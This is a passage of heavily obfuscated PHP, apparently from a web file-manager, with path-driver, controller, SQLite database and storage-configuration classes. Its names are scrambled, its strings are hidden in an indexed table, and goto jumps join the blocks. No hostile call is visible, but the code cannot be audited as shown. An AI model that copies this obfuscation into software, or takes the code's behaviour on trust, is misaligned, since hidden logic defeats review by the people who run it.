($í¢ß¼Ü as &$á¶øÒ×Ó) { $á¶øÒ×Ó[$Ôí¨ª[87]] = $this->pathDriver . $Ôí¨ª[8] . ltrim(substr($á¶øÒ×Ó[$Ôí¨ª[87]], strlen($ëåêª)), $Ôí¨ª[8]); } unset($á¶øÒ×Ó); return $í¢ß¼Ü; } public function listAllSimple($ÀàÀÉ¾Ü, $‹Ş“Ğ¢ = false) { $úÓÃ¤… =& $_SERVER[²Ö÷öõ]; $ïŠ€•’» = $this->listAll($ÀàÀÉ¾Ü); $şš‰»üŒ = $this->pathParse[$úÓÃ¤…[495]]; if (trim($şš‰»üŒ, $úÓÃ¤…[8]) == trim(get_path_father($şš‰»üŒ), $úÓÃ¤…[8])) { $‹Ş“Ğ¢ = !0; } return IO::init($úÓÃ¤…[12])->listAllSimpleMake($ïŠ€•’», $şš‰»üŒ, $‹Ş“Ğ¢); } public function getPathOuter($–åĞ½ô) { $€´ŞÚ¾ =& $_SERVER[²Ö÷öõ]; $êùÕ½™É = KodIO::parse($–åĞ½ô); if ($êùÕ½™É[$€´ŞÚ¾[33]] == KodIO::KOD_SHARE_ITEM) { return $êùÕ½™É[$€´ŞÚ¾[87]]; } $••áúÚ• = KodIO::clear($–åĞ½ô); $‰öâ¼ = KodIO::clear($this->pathParse[$€´ŞÚ¾[560]][$€´ŞÚ¾[1265]]); $Ôè¸ ñÏ = substr($••áúÚ•, strlen($‰öâ¼)); if (substr($••áúÚ•, 0, strlen($‰öâ¼)) != $‰öâ¼) { return !1; } return $this->pathParse[$€´ŞÚ¾[1259]] . $€´ŞÚ¾[8] . ltrim($Ôè¸ ñÏ, $€´ŞÚ¾[8]); } public function getType() { $ÇûÈãß =& $_SERVER[²Ö÷öõ]; $ö½ßòêá = str_replace($ÇûÈãß[77], $ÇûÈãß[12], get_class($this)); return strtolower($ö½ßòêá); } public function isOsDriver($ú£Â¥ë¯) { return IO::isOsDriver($ú£Â¥ë¯); } public function info($å–ûòÊí) { return $this->infoParse($å–ûòÊí); } public function infoAuth($¾å‚µÅ) { return $this->infoParse($¾å‚µÅ); } public function infoWithChildren($šıÎ×¸ß) { return $this->infoParse($šıÎ×¸ß, !0); } public function infoFull($äÇıøÒ™) { return $this->infoParse($äÇıøÒ™); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($½ö¤µÂß) { $this->pathParse = $½ö¤µÂß; } protected function infoParse($úÜ‚‡™¯, $¡ƒ‹Œá = false) { $«Ğè¸€ =& $_SERVER[²Ö÷öõ]; return Action($«Ğè¸€[1264])->sharePathInfo($this->pathParse[$«Ğè¸€[87]], !0, $¡ƒ‹Œá); } public function listPath($°÷¼÷ôö, $é¥ïİ• = false) { $î¯Üœ•ˆ =& $_SERVER[²Ö÷öõ]; $î¶ó… = IO::listPath($°÷¼÷ôö, $é¥ïİ•); if (!$î¶ó…) { return $î¶ó…; } if (is_array($î¶ó…[$î¯Üœ•ˆ[1436]])) { $ïõÀü®² = Action($î¯Üœ•ˆ[1445])->parsePathChildren($î¶ó…[$î¯Üœ•ˆ[1436]], array($î¯Üœ•ˆ[495] => $°÷¼÷ôö)); $î¶ó…[$î¯Üœ•ˆ[1436]] = Action($î¯Üœ•ˆ[1264])->shareItemInfo($ïõÀü®²); } foreach ($î¶ó… as $èÑàŒ£í => $ªˆèòÖú) { if (!in_array($èÑàŒ£í, array($î¯Üœ•ˆ[86], $î¯Üœ•ˆ[85]))) { continue; } foreach ($ªˆèòÖú as $ÁË¿éı• => $ïõÀü®²) { $ïõÀü®² = Action($î¯Üœ•ˆ[1445])->parsePathChildren($ïõÀü®², array($î¯Üœ•ˆ[495] => $°÷¼÷ôö)); $î¶ó…[$èÑàŒ£í][$ÁË¿éı•] = Action($î¯Üœ•ˆ[1264])->shareItemInfo($ïõÀü®²); } } return $î¶ó…; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¨ØĞÂû) { parent::__construct($¨ØĞÂû); $this->setSignVersion($_SERVER[²Ö÷öõ][247]); } } goto aˆñ»ã¥; d´¥ÂĞ­‚¦: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $É¹ÊÊÓŞ =& $_SERVER[²Ö÷öõ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$É¹ÊÊÓŞ[6]] =& $config; $this->values[$É¹ÊÊÓŞ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $É¹ÊÊÓŞ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÒÌş—ä„) { if (1 === func_num_args()) { $this->{$ÒÌş—ä„} = new $ÒÌş—ä„(); } else { $¿ñ¿›¿Õ = new ReflectionClass($ÒÌş—ä„); $‰Å÷ìîî = func_get_args(); array_shift($‰Å÷ìîî); $this->{$ÒÌş—ä„} = $¿ñ¿›¿Õ->newInstanceArgs($‰Å÷ìîî); } return $this->{$ÒÌş—ä„}; } public function routeBind($Ó °êÔØ, $‹Ö”İñ, $ŠéÈˆ’â = 3) { $—Î¡¤÷ =& $_SERVER[²Ö÷öõ]; $úÍˆ³ñˆ = $this->in[$—Î¡¤÷[9]]; $Ó °êÔØ = str_replace($—Î¡¤÷[10], $—Î¡¤÷[11], trim(trim($Ó °êÔØ, $—Î¡¤÷[8]), $—Î¡¤÷[12])); if (!$Ó °êÔØ || count($úÍˆ³ñˆ) <= $ŠéÈˆ’â) { return !1; } $ß•£Ü¯„ = !0; $Ë¼Ã¾×® = explode($—Î¡¤÷[8], $Ó °êÔØ); for ($¡Ñ±ã¹¨ = 0; $¡Ñ±ã¹¨ < count($Ë¼Ã¾×®); $¡Ñ±ã¹¨++) { if ($Ë¼Ã¾×®[$¡Ñ±ã¹¨] != $úÍˆ³ñˆ[$ŠéÈˆ’â + $¡Ñ±ã¹¨]) { $ß•£Ü¯„ = !1; break; } } if (!$ß•£Ü¯„) { return; } call_user_func_array(array($this, $‹Ö”İñ), array()); } public function routeArgs($äˆ¼äÑÂ = 3) { $ƒÁ‰Ù¦³ = $this->in[$_SERVER[²Ö÷öõ][9]]; if (count($ƒÁ‰Ù¦³) <= $äˆ¼äÑÂ) { return array(); } $ÙÎ­òå¶ = array(); for ($‰ÕÕì×û = $äˆ¼äÑÂ; $‰ÕÕì×û < count($ƒÁ‰Ù¦³); $‰ÕÕì×û += 2) { $ÙÎ­òå¶[$ƒÁ‰Ù¦³[$‰ÕÕì×û]] = $ƒÁ‰Ù¦³[$‰ÕÕì×û + 1]; $this->in[$ƒÁ‰Ù¦³[$‰ÕÕì×û]] = $ƒÁ‰Ù¦³[$‰ÕÕì×û + 1]; } return $ÙÎ­òå¶; } protected function assign($Ù•­•À‚, $´Û¥ø¾š) { $this->values[$Ù•­•À‚] = $´Û¥ø¾š; } protected function display($¦™êá¯¯) { ob_end_clean(); extract($this->values); require $this->tpl . $¦™êá¯¯; } } class DbSqliteBase extends Db { public function __construct($™ÏµŞ×¨ = '') { $Ş’…¦Ø =& $_SERVER[²Ö÷öõ]; if (!extension_loaded($Ş’…¦Ø[13])) { think_exception(think_lang($Ş’…¦Ø[14]) . $Ş’…¦Ø[15]); } if (!empty($™ÏµŞ×¨)) { if (!isset($™ÏµŞ×¨[$Ş’…¦Ø[16]])) { $™ÏµŞ×¨[$Ş’…¦Ø[16]] = 438; } $this->config = $™ÏµŞ×¨; if (empty($this->config[$Ş’…¦Ø[17]])) { $this->config[$Ş’…¦Ø[17]] = array(); } } } public function connect($¢ªñß¥Á = '', $šïòøô = 0) { $ÚÁÒı¾Å =& $_SERVER[²Ö÷öõ]; if (!isset($this->linkID[$šïòøô])) { if (empty($¢ªñß¥Á)) { $¢ªñß¥Á = $this->config; } $­®›Õ² = !empty($¢ªñß¥Á[$ÚÁÒı¾Å[17]][$ÚÁÒı¾Å[18]]) ? $¢ªñß¥Á[$ÚÁÒı¾Å[17]][$ÚÁÒı¾Å[18]] : $this->pconnect; $Öè…·Œ— = $­®›Õ² ? $ÚÁÒı¾Å[19] : $ÚÁÒı¾Å[20]; $this->linkID[$šïòøô] = $Öè…·Œ—($¢ªñß¥Á[$ÚÁÒı¾Å[21]], $¢ªñß¥Á[$ÚÁÒı¾Å[16]]); if (!$this->linkID[$šïòøô]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$šïòøô], 30000); if (1 != think_config($ÚÁÒı¾Å[22])) { unset($this->config); } } return $this->linkID[$šïòøô]; } public function free() { $this->queryID = null; } public function query($×›“ÔÛŞ) { $ğ ãëîö =& $_SERVER[²Ö÷öõ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $×›“ÔÛŞ; if ($this->queryID) { $this->free(); } think_action_status($ğ ãëîö[23], 1); think_status($ğ ãëîö[24]); $this->queryID = sqlite_query($this->_linkID, $×›“ÔÛŞ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ñƒãš»´ = $this->getAll(); return $Ñƒãš»´; } } public function execute($ª¸ƒÕçğ) { $Üôûâ®¾ =& $_SERVER[²Ö÷öõ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ª¸ƒÕçğ; if ($this->queryID) { $this->free(); } think_action_status($Üôûâ®¾[25], 1); think_status($Üôûâ®¾[24]); $ì¡Ï¤Â = sqlite_exec($this->_linkID, $ª¸ƒÕçğ); $this->debug(); if (!1 === $ì¡Ï¤Â) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[²Ö÷öõ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ê¨ÜÈı— = sqlite_query($this->_linkID, $_SERVER[²Ö÷öõ][27]); if (!$Ê¨ÜÈı—) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $™’„õõ’ = sqlite_query($this->_linkID, $_SERVER[²Ö÷öõ][28]); if (!$™’„õõ’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $âçÑ—ü» = array(); if ($this->numRows > 0) { for ($¦²ª»¶æ = 0; $¦²ª»¶æ < $this->numRows; $¦²ª»¶æ++) { $âçÑ—ü»[$¦²ª»¶æ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $âçÑ—ü»; } public function getFields($ªÎĞê´ş) { $Ôï£°»¢ =& $_SERVER[²Ö÷öõ]; $é±½ÎÃ¾ = $this->query($Ôï£°»¢[29] . $ªÎĞê´ş . $Ôï£°»¢[30]); $Ÿ…À•Òø = array(); if ($é±½ÎÃ¾) { foreach ($é±½ÎÃ¾ as $ˆò†Üú§ => $ÔÕäÜÛ¬) { $Ÿ…À•Òø[$ÔÕäÜÛ¬[$Ôï£°»¢[31]]] = array($Ôï£°»¢[32] => $ÔÕäÜÛ¬[$Ôï£°»¢[31]], $Ôï£°»¢[33] => $ÔÕäÜÛ¬[$Ôï£°»¢[34]], $Ôï£°»¢[35] => (bool) ($ÔÕäÜÛ¬[$Ôï£°»¢[36]] === $Ôï£°»¢[12]), $Ôï£°»¢[37] => $ÔÕäÜÛ¬[$Ôï£°»¢[38]], $Ôï£°»¢[39] => strtolower($ÔÕäÜÛ¬[$Ôï£°»¢[40]]) == $Ôï£°»¢[41], $Ôï£°»¢[42] => strtolower($ÔÕäÜÛ¬[$Ôï£°»¢[43]]) == $Ôï£°»¢[44]); } } return $Ÿ…À•Òø; } public function getTables($ÔÅÃÌîÌ = '') { $‚õÛîï =& $_SERVER[²Ö÷öõ]; $š†ÈËˆ­ = $this->query($‚õÛîï[45] . $‚õÛîï[46] . $‚õÛîï[47]); $”â…Áê¼ = array(); foreach ($š†ÈËˆ­ as $÷ÈÎï¯ğ => $¤¹°‡ ) { $”â…Áê¼[$÷ÈÎï¯ğ] = current($¤¹°‡ ); } return $”â…Áê¼; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÏìüäŞ“ =& $_SERVER[²Ö÷öõ]; $†Ûñ‡ß½ = sqlite_last_error($this->_linkID); $this->error = $†Ûñ‡ß½ . $ÏìüäŞ“[4] . sqlite_error_string($†Ûñ‡ß½); if ($ÏìüäŞ“[12] != $this->queryStr) { $this->error .= LNG($ÏìüäŞ“[48]) . $this->queryStr; } think_trace($this->error, $ÏìüäŞ“[12], $ÏìüäŞ“[49]); return $this->error; } public function escapeString($°ìü£Î¥) { return sqlite_escape_string($°ìü£Î¥); } public function parseLimit($ÏöÌªŒÄ) { $¬ÍÓ™Ôé =& $_SERVER[²Ö÷öõ]; $‹ç®Àé˜ = $¬ÍÓ™Ôé[12]; if (!empty($ÏöÌªŒÄ)) { $ÏöÌªŒÄ = explode($¬ÍÓ™Ôé[50], $ÏöÌªŒÄ); if (count($ÏöÌªŒÄ) > 1) { $‹ç®Àé˜ .= $¬ÍÓ™Ôé[51] . $ÏöÌªŒÄ[1] . $¬ÍÓ™Ôé[52] . $ÏöÌªŒÄ[0] . $¬ÍÓ™Ôé[53]; } else { $‹ç®Àé˜ .= $¬ÍÓ™Ôé[51] . $ÏöÌªŒÄ[0] . $¬ÍÓ™Ôé[53]; } } return $‹ç®Àé˜; } } class DbSqlite3Base extends Db { public function __construct($»‰¸‡å = '') { $å¥Â¤ò× =& $_SERVER[²Ö÷öõ]; if (!class_exists($å¥Â¤ò×[54])) { think_exception(think_lang($å¥Â¤ò×[14]) . $å¥Â¤ò×[55]); } if (!empty($»‰¸‡å)) { if (!isset($»‰¸‡å[$å¥Â¤ò×[16]])) { $»‰¸‡å[$å¥Â¤ò×[16]] = 438; } $this->config = $»‰¸‡å; if (empty($this->config[$å¥Â¤ò×[17]])) { $this->config[$å¥Â¤ò×[17]] = array(); } } } public function connect($¶…òô = '', $©‚’Ëƒ“ = 0) { $’ Ó¥Ù“ =& $_SERVER[²Ö÷öõ]; if (!isset($this->linkID[$©‚’Ëƒ“])) { if (empty($¶…òô)) { $¶…òô = $this->config; } $this->linkID[$©‚’Ëƒ“] = new SQLite3($¶…òô[$’ Ó¥Ù“[21]]); if (!$this->linkID[$©‚’Ëƒ“]) { think_exception($this->linkID[$©‚’Ëƒ“]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$©‚’Ëƒ“]->busyTimeout(30000); if (1 != think_config($’ Ó¥Ù“[22])) { unset($this->config); } } return $this->linkID[$©‚’Ëƒ“]; } public function free() { $this->queryID = null; } public function query($Ì˜ÏßÜó) { $Ó¿ü‡¬’ =& $_SERVER[²Ö÷öõ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ì˜ÏßÜó; if ($this->queryID) { $this->free(); } think_action_status($Ó¿ü‡¬’[23], 1); think_status($Ó¿ü‡¬’[24]); $this->queryID = $this->_linkID->query($Ì˜ÏßÜó); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¦ñ¤şêÖ = $this->getAll(); $this->numRows = count($¦ñ¤şêÖ); return $¦ñ¤şêÖ; } } public function execute($¬ƒ¼‘îè) { $Ó“àÑ¾‹ =& $_SERVER[²Ö÷öõ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¬ƒ¼‘îè; if ($this->queryID) { $this->free(); } think_action_status($Ó“àÑ¾‹[25], 1); think_status($Ó“àÑ¾‹[24]); $Å‹Ğ—×Ú = $this->_linkID->exec($¬ƒ¼‘îè); $this->debug(); if (!1 === $Å‹Ğ—×Ú) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[²Ö÷öõ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Â´â•Ûæ = $this->_linkID->query($_SERVER[²Ö÷öõ][27]); if (!$Â´â•Ûæ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Şì‚ß¤ = $this->_linkID->query($_SERVER[²Ö÷öõ][28]); if (!$Şì‚ß¤) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $úŞÚü²× = array(); while ($¢Ç–»³õ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $úŞÚü²×[] = $¢Ç–»³õ; } $this->queryID->reset(); return $úŞÚü²×; } public function getFields($¥æ²«¬¢) { $¡Ìª¨ŞÈ =& $_SERVER[²Ö÷öõ]; $ÏÕ‘Ãô¬ = $this->query($¡Ìª¨ŞÈ[29] . $¥æ²«¬¢ . $¡Ìª¨ŞÈ[30]); $„ç€º = array(); if ($ÏÕ‘Ãô¬) { foreach ($ÏÕ‘Ãô¬ as $šé½®Íß => $ÚàÚ•ÑÜ) { $„ç€º[$ÚàÚ•ÑÜ[$¡Ìª¨ŞÈ[32]]] = array($¡Ìª¨ŞÈ[32] => $ÚàÚ•ÑÜ[$¡Ìª¨ŞÈ[32]], $¡Ìª¨ŞÈ[33] => $ÚàÚ•ÑÜ[$¡Ìª¨ŞÈ[33]], $¡Ìª¨ŞÈ[35] => (bool) ($ÚàÚ•ÑÜ[$¡Ìª¨ŞÈ[35]] === $¡Ìª¨ŞÈ[12]), $¡Ìª¨ŞÈ[37] => $ÚàÚ•ÑÜ[$¡Ìª¨ŞÈ[56]], $¡Ìª¨ŞÈ[39] => (bool) $ÚàÚ•ÑÜ[$¡Ìª¨ŞÈ[57]], $¡Ìª¨ŞÈ[42] => (bool) $ÚàÚ•ÑÜ[$¡Ìª¨ŞÈ[57]]); } } return $„ç€º; } public function getTables($üß¨ú† = '') { $Å¼„¨œµ =& $_SERVER[²Ö÷öõ]; $»î¹Õö‰ = $this->query($Å¼„¨œµ[45] . $Å¼„¨œµ[46] . $Å¼„¨œµ[47]); $µ¸òÉÚí = array(); foreach ($»î¹Õö‰ as $•á§±üø => $ŸÑõìÄ±) { $µ¸òÉÚí[$•á§±üø] = current($ŸÑõìÄ±); } return $µ¸òÉÚí; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ë‚ŒŒºë =& $_SERVER[²Ö÷öõ]; $this->error = $this->_linkID->lastErrorMsg(); if ($ë‚ŒŒºë[12] != $this->queryStr) { $this->error .= LNG($ë‚ŒŒºë[48]) . $this->queryStr; } think_trace($this->error, $ë‚ŒŒºë[12], $ë‚ŒŒºë[49]); return $this->error; } public function escapeString($ˆúÖ¶è²) { $Ëå•¹Û =& $_SERVER[²Ö÷öõ]; if ($this->_linkID) { return $this->_linkID->escapeString($ˆúÖ¶è²); } return str_ireplace($Ëå•¹Û[58], $Ëå•¹Û[59], $ˆúÖ¶è²); } public function parseLimit($˜»’‚³Ä) { $ÒóÖÛØğ =& $_SERVER[²Ö÷öõ]; $Ó‰©Œí = $ÒóÖÛØğ[12]; if (!empty($˜»’‚³Ä)) { $˜»’‚³Ä = explode($ÒóÖÛØğ[50], $˜»’‚³Ä); if (count($˜»’‚³Ä) > 1) { $Ó‰©Œí .= $ÒóÖÛØğ[51] . $˜»’‚³Ä[1] . $ÒóÖÛØğ[52] . $˜»’‚³Ä[0] . $ÒóÖÛØğ[53]; } else { $Ó‰©Œí .= $ÒóÖÛØğ[51] . $˜»’‚³Ä[0] . $ÒóÖÛØğ[53]; } } return $Ó‰©Œí; } } goto BÜó¨Îé¸; eÊÊ‰ä¬ÌØ: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\x73\x74\157\x72\141\x67\x65\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\163\x69\172\x65\x4d\x61\170", "\163\x79\x73\x74\145\155", "\x64\145\146\x61\x75\x6c\x74", "\x64\162\151\x76\145\x72", "\143\x6f\156\146\x69\147"); public function listData($À²¹®ïò = false, $²ØÈ„Òİ = "\155\157\x64\x69\x66\171\x54\x69\x6d\x65", $ĞŒéÇÇŞ = false) { $›ª¯şÃı =& $_SERVER[²Ö÷öõ]; $ø¾»Ì¿Œ = parent::listData($À²¹®ïò, $²ØÈ„Òİ, $ĞŒéÇÇŞ); if ($À²¹®ïò) { return $ø¾»Ì¿Œ; } $íÕĞøŞÑ = array(); if ($GLOBALS[$›ª¯şÃı[2306]]) { $íÕĞøŞÑ = $this->ioSizeUseGet(array_to_keyvalue($ø¾»Ì¿Œ, $›ª¯şÃı[12], $›ª¯şÃı[475])); } foreach ($ø¾»Ì¿Œ as $Ü²ƒ’µ÷ => $Îõ’¦—) { unset($ø¾»Ì¿Œ[$Ü²ƒ’µ÷][$›ª¯şÃı[6]]); $ø¾»Ì¿Œ[$Ü²ƒ’µ÷][$›ª¯şÃı[1968]] = isset($íÕĞøŞÑ[$Îõ’¦—[$›ª¯şÃı[475]]]) ? $íÕĞøŞÑ[$Îõ’¦—[$›ª¯şÃı[475]]] : 0; } return $ø¾»Ì¿Œ; } public function ioSizeUseGet($ƒô¹Œø–) { $à©ÇÑ¸æ =& $_SERVER[²Ö÷öõ]; if (!$ƒô¹Œø–) { return array(); } $¿™Ûòå = $à©ÇÑ¸æ[2307] . implode($à©ÇÑ¸æ[50], $ƒô¹Œø–); $ĞìÑÒı = Cache::get($¿™Ûòå); if ($ĞìÑÒı) { return $ĞìÑÒı; } $ˆˆ×ï„ = array($à©ÇÑ¸æ[900] => $à©ÇÑ¸æ[475], $à©ÇÑ¸æ[2308] => $à©ÇÑ¸æ[79]); $¨‰¦üÄß = array($à©ÇÑ¸æ[900] => array($à©ÇÑ¸æ[7], $ƒô¹Œø–)); $ĞìÑÒı = Model($à©ÇÑ¸æ[872])->field($ˆˆ×ï„)->where($¨‰¦üÄß)->group($à©ÇÑ¸æ[900])->select(); $ĞìÑÒı = array_to_keyvalue($ĞìÑÒı, $à©ÇÑ¸æ[475], $à©ÇÑ¸æ[79]); Cache::set($¿™Ûòå, $ĞìÑÒı, 600); return $ĞìÑÒı; } public function getConfig($¨œ¿‰ØÁ) { $•—ãİ = parent::listData($¨œ¿‰ØÁ); return json_decode($•—ãİ[$_SERVER[²Ö÷öõ][6]], !0); } public function update($êù½Ş, $Ú£¸Á¥§) { $ŒÃ°¯¦¬ =& $_SERVER[²Ö÷öõ]; $¡ğƒÜ± = $Ú£¸Á¥§[$ŒÃ°¯¦¬[32]]; $Ù¨ô¤Æ = array_to_keyvalue(parent::listData(), $ŒÃ°¯¦¬[32]); if (isset($Ù¨ô¤Æ[$¡ğƒÜ±]) && $Ù¨ô¤Æ[$¡ğƒÜ±][$ŒÃ°¯¦¬[475]] != $êù½Ş) { return !1; } $this->checkPwd($êù½Ş, $Ú£¸Á¥§); if (isset($Ú£¸Á¥§[$ŒÃ°¯¦¬[2309]]) && $Ú£¸Á¥§[$ŒÃ°¯¦¬[2309]] == $ŒÃ°¯¦¬[91]) { $this->checkConfig($Ú£¸Á¥§); } unset($Ú£¸Á¥§[$ŒÃ°¯¦¬[2309]]); $˜³¨Ï©‡ = parent::update($êù½Ş, $Ú£¸Á¥§); if ($˜³¨Ï©‡ && $Ú£¸Á¥§[$ŒÃ°¯¦¬[37]]) { $ÆÊÌ² = 0; foreach ($Ù¨ô¤Æ as $âÑšÀ¹Î) { if ($âÑšÀ¹Î[$ŒÃ°¯¦¬[37]] && $âÑšÀ¹Î[$ŒÃ°¯¦¬[475]] != $êù½Ş) { $ÆÊÌ² = $âÑšÀ¹Î[$ŒÃ°¯¦¬[475]]; parent::update($âÑšÀ¹Î[$ŒÃ°¯¦¬[475]], array($ŒÃ°¯¦¬[37] => 0)); } } $this->updateBackup($êù½Ş, $ÆÊÌ²); } return $˜³¨Ï©‡; } public function add($ÅÖàú™è) { $¨½öŸôÖ =& $_SERVER[²Ö÷öõ]; $ˆåƒ‘¯¨ = array_to_keyvalue(parent::listData(), $¨½öŸôÖ[32]); if (isset($ˆåƒ‘¯¨[$ÅÖàú™è[$¨½öŸôÖ[32]]])) { return !1; } $this->checkConfig($ÅÖàú™è); $œÚ÷ë = parent::insert($ÅÖàú™è); if ($œÚ÷ë && $ÅÖàú™è[$¨½öŸôÖ[37]]) { foreach ($ˆåƒ‘¯¨ as $÷›‰‹¢) { if ($÷›‰‹¢[$¨½öŸôÖ[37]]) { parent::update($÷›‰‹¢[$¨½öŸôÖ[475]], array($¨½öŸôÖ[37] => 0)); } } } return $œÚ÷ë; } public function updateBackup($”…ÚŒ–, $“ì¹¶­Ê) { $¡¬ÏËğ’ =& $_SERVER[²Ö÷öõ]; if (!$“ì¹¶­Ê) { return; } $’Ø«š” = Model($¡¬ÏËğ’[831])->config(); if ($’Ø«š”[$¡¬ÏËğ’[1750]] != $¡¬ÏËğ’[91] || $’Ø«š”[$¡¬ÏËğ’[835]] != $“ì¹¶­Ê) { return; } $æ‚•´í = Model($¡¬ÏËğ’[853])->get($¡¬ÏËğ’[866]); $æ‚•´í = json_decode($æ‚•´í, !0); if (!$æ‚•´í) { return; } $æ‚•´í[$¡¬ÏËğ’[835]] = $”…ÚŒ–; Model($¡¬ÏËğ’[853])->set(array($¡¬ÏËğ’[866] => $æ‚•´í)); } public function checkPwd($ª‡­îâè, &$¶óì·í) { $óõ«ƒ“ç =& $_SERVER[²Ö÷öõ]; if (empty($¶óì·í[$óõ«ƒ“ç[6]])) { return; } $•¤Íß¸£ = json_decode($¶óì·í[$óõ«ƒ“ç[6]], !0); $µóšùìå = $óõ«ƒ“ç[12]; $ÆÁÄôë‚ = array($óõ«ƒ“ç[2310], $óõ«ƒ“ç[2311], $óõ«ƒ“ç[975]); foreach ($ÆÁÄôë‚ as $Ñû†‡·) { if (isset($•¤Íß¸£[$Ñû†‡·])) { $µóšùìå = $Ñû†‡·; break; } } if (!$µóšùìå) { return; } $ÒşëÚœ = $this->getConfig($ª‡­îâè); $ñ¥âêóì = $ÒşëÚœ[$µóšùìå]; $ÍôâéîÒ = $•¤Íß¸£[$µóšùìå]; if ($ÍôâéîÒ == str_repeat($óõ«ƒ“ç[220], strlen($ñ¥âêóì))) { $•¤Íß¸£[$µóšùìå] = $ñ¥âêóì; $¶óì·í[$óõ«ƒ“ç[6]] = json_encode($•¤Íß¸£); } else { if ($ÍôâéîÒ != $ñ¥âêóì) { $¶óì·í[$óõ«ƒ“ç[2309]] = $óõ«ƒ“ç[91]; } } } public function checkConfig(&$Ì—¡ıå, $Èç§ãñ = false) { $®ŸÇõù› =& $_SERVER[²Ö÷öõ]; $ĞšÛ‹– = strtolower($Ì—¡ıå[$®ŸÇõù›[98]]); $Æ‚ùÀâ = json_decode($Ì—¡ıå[$®ŸÇõù›[6]], !0); foreach ($Æ‚ùÀâ as $ñ¥ì‚Ğ => $øî—«›) { if (is_string($øî—«›)) { $Æ‚ùÀâ[$ñ¥ì‚Ğ] = trim($øî—«›); } } $Æ‚ùÀâ[$®ŸÇõù›[2312]] = rand_string(6); $„íè¯” = $GLOBALS[$®ŸÇõù›[6]][$®ŸÇõù›[92]][$®ŸÇõù›[908]]; $ÜÑ¤™ÔÛ = isset($„íè¯”[$ĞšÛ‹–]) ? $„íè¯”[$ĞšÛ‹–] : ucfirst($ĞšÛ‹–); $ã‚ÚÎí = $®ŸÇõù›[77] . $ÜÑ¤™ÔÛ; if (!$ÜÑ¤™ÔÛ || !class_exists($ã‚ÚÎí)) { if ($Èç§ãñ) { return LNG($®ŸÇõù›[2313]); } write_log(array($®ŸÇõù›[2314], $Ì—¡ıå, get_caller_info()), $®ŸÇõù›[215]); show_json(LNG($®ŸÇõù›[2313]), !1, $Ì—¡ıå); } $©ï‡ÁÂ = new $ã‚ÚÎí($Æ‚ùÀâ); if (in_array($ĞšÛ‹–, $©ï‡ÁÂ->objectDriver)) { try { if (!$©ï‡ÁÂ->isBucketCors() && !$©ï‡ÁÂ->setBucketCors()) { $äÇ‡ìÛÜ = LNG($®ŸÇõù›[2315]); $äÇ‡ìÛÜ .= $®ŸÇõù›[2316] . LNG($®ŸÇõù›[2317]); } } catch (Exception $£ËˆœÌ) { $äÇ‡ìÛÜ = $£ËˆœÌ->getMessage(); } if (isset($äÇ‡ìÛÜ)) { return $this->_parseError($äÇ‡ìÛÜ, $ĞšÛ‹–, $Èç§ãñ); } if ($ĞšÛ‹– == $®ŸÇõù›[68] && !$©ï‡ÁÂ->checkRegion()) { return $this->_parseError(LNG($®ŸÇõù›[2318]), $ĞšÛ‹–, $Èç§ãñ); } } $Æ¾ı÷‰ø = rtrim($Æ‚ùÀâ[$®ŸÇõù›[1270]], $®ŸÇõù›[8]) . $®ŸÇõù›[8]; $ÍÛªæºÅ = $©ï‡ÁÂ->getPath($Æ¾ı÷‰ø . $®ŸÇõù›[1274]); try { if ($ĞšÛ‹– == $®ŸÇõù›[109]) { $©ï‡ÁÂ->mkdir($Æ¾ı÷‰ø); } $ğçŒµÒª = $©ï‡ÁÂ->mkfile($ÍÛªæºÅ); if (!$ğçŒµÒª) { $äÇ‡ìÛÜ = LNG($®ŸÇõù›[2315]); } } catch (Exception $£ËˆœÌ) { $äÇ‡ìÛÜ = $£ËˆœÌ->getMessage(); } if (isset($äÇ‡ìÛÜ)) { return $this->_parseError($äÇ‡ìÛÜ, $ĞšÛ‹–, $Èç§ãñ); } $Æ‚ùÀâ[$®ŸÇõù›[1270]] = $Æ¾ı÷‰ø; $Ì—¡ıå[$®ŸÇõù›[6]] = json_encode($Æ‚ùÀâ); $Ì—¡ıå[$®ŸÇõù›[98]] = $ÜÑ¤™ÔÛ; return !0; } private function _parseError($ÉÎÈ‘ï¬, 